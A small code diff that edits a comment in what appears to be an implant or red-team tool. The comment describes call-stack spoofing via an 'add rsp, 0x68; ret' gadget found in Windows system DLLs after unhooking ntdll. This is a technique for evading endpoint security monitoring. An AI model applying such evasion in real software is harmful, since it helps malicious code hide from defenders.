@@ -59,7 +59,7 @@ static_assert(sizeof(SpoofContext)                  == 120, "SpoofContext layout
 #endif // _WIN64
 
 // One-time init. Searches the operator-configured module list
-// (CONFIG_CALLSTACK_SPOOF_MODULES in config.hpp — defaults to
+// (CONFIG_CALLSTACK_SPOOF_MODULES in config.hpp - defaults to
 // ntdll/kernel32/kernelbase) for `add rsp, 0x68; ret`. Call after
 // UnhookNtdll(). Returns FALSE if no gadget found; SpoofCall will forward
 // the call directly (no stack spoofing, but still functional).
